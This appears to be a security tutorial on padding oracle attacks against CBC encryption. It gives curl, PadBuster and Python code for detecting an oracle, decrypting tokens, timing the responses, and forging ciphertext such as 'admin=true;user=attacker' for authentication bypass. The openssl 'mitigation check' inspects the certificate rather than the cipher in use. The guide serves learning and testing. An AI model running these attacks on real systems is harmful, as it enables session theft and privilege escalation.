# Padding Oracle Attack Guide

> Exploit CBC mode padding validation to decrypt ciphertext without the key. This guide covers manual exploitation, PadBuster automation, and detection of vulnerable implementations.

## 1. Understanding the Vulnerability

A padding oracle exists when an application reveals whether decrypted ciphertext has valid PKCS#7 padding. The attacker manipulates ciphertext bytes and observes responses (timing differences, error codes, or behavior changes) to deduce plaintext one byte at a time.

**Conditions required:**
- CBC mode encryption in use
- Application leaks padding validity (distinct error for bad padding vs. bad data)
- Attacker can submit modified ciphertext and observe the response

## 2. Identifying Padding Oracles

Detect the oracle by sending valid vs. corrupted ciphertext and comparing responses:

```bash
# Capture a valid encrypted token (e.g., from a cookie)
VALID_TOKEN="3a7f2b...encrypted_hex..."

# Flip the last byte of the second-to-last block
CORRUPTED=$(echo "$VALID_TOKEN" | python3 -c "
import sys
data = bytes.fromhex(sys.stdin.read().strip())
modified = data[:-17] + bytes([data[-17] ^ 0x01]) + data[-16:]
print(modified.hex())
")

# Compare HTTP responses
curl -s -o /dev/null -w '%{http_code}' -b "token=$VALID_TOKEN" https://target/app
curl -s -o /dev/null -w '%{http_code}' -b "token=$CORRUPTED" https://target/app
```

Different status codes (e.g., 200 vs. 500 vs. 403) confirm the oracle.

## 3. Automated Decryption with PadBuster

PadBuster automates the byte-by-byte decryption process:

```bash
# Basic decryption of a cookie value
padbuster https://target/app/login "3a7f2b8c9d..." 8 \
  -cookies "auth=3a7f2b8c9d..." \
  -encoding 0

# Parameters:
#   URL          - target endpoint
#   EncryptedSample - the ciphertext to decrypt
#   BlockSize    - 8 (DES/3DES) or 16 (AES)
#   -encoding    - 0=hex, 1=base64, 2=url-encoded base64
```

```bash
# Decrypt a Base64-encoded token with custom error signature
padbuster https://target/api/session "dGVzdC1lbmNyeXB0ZWQ=" 16 \
  -encoding 1 \
  -error "Invalid session" \
  -verbose
```

## 4. Encrypting Arbitrary Plaintext

Once the oracle is confirmed, forge new valid ciphertext:

```bash
# Encrypt custom plaintext using the oracle
padbuster https://target/app "3a7f2b8c9d..." 16 \
  -cookies "auth=3a7f2b8c9d..." \
  -encoding 0 \
  -plaintext "admin=true;user=attacker"
```

This produces a valid ciphertext that decrypts to your chosen plaintext, enabling authentication bypass or privilege escalation.

## 5. Python Manual Exploitation

When PadBuster cannot handle custom protocols:

```python
import requests

def check_padding(ciphertext_hex, url):
    """Returns True if padding is valid."""
    resp = requests.get(url, cookies={"token": ciphertext_hex})
    return resp.status_code != 500

def decrypt_byte(block, prev_block, byte_pos, known_bytes, url):
    """Decrypt a single byte using the padding oracle."""
    pad_value = len(known_bytes) + 1
    tampered = bytearray(prev_block)
    
    # Set already-known bytes to produce correct padding
    for i, kb in enumerate(known_bytes):
        tampered[-(i + 1)] = kb ^ pad_value
    
    # Brute-force the target byte
    for guess in range(256):
        tampered[byte_pos] = guess
        ct = tampered.hex() + block.hex()
        if check_padding(ct, url):
            return guess ^ pad_value
    return None
```

## 6. Timing-Based Oracles

Some implementations do not return distinct errors but have timing differences:

```bash
# Measure response times to detect timing oracle
for i in $(seq 0 255); do
  HEX=$(printf '%02x' $i)
  MODIFIED="${CIPHERTEXT:0:-2}${HEX}"
  TIME=$(curl -s -o /dev/null -w '%{time_total}' \
    -b "session=$MODIFIED" https://target/app)
  echo "$HEX: $TIME"
done | sort -t: -k2 -n
```

A significantly longer response for one byte value indicates valid padding (the application proceeded to process the decrypted data).

## 7. Mitigation Verification

Confirm that fixes are properly applied:

```bash
# Verify the application uses authenticated encryption (AES-GCM)
# Check for constant-time comparison and no padding distinction
openssl s_client -connect target:443 2>/dev/null | \
  openssl x509 -noout -text | grep -i "cipher\|algorithm"

# Test that error responses are identical regardless of padding
diff <(curl -s -D- -b "token=$VALID" https://target/app 2>&1) \
     <(curl -s -D- -b "token=$CORRUPTED" https://target/app 2>&1)
```

## 8. Key Takeaways

- Block size detection: try 8 (DES) and 16 (AES) with PadBuster
- Always check multiple oracle indicators: HTTP status, response body, timing, redirects
- Forging ciphertext requires N+1 blocks for N blocks of plaintext
- Modern defense: use AES-GCM or ChaCha20-Poly1305 (authenticated encryption)
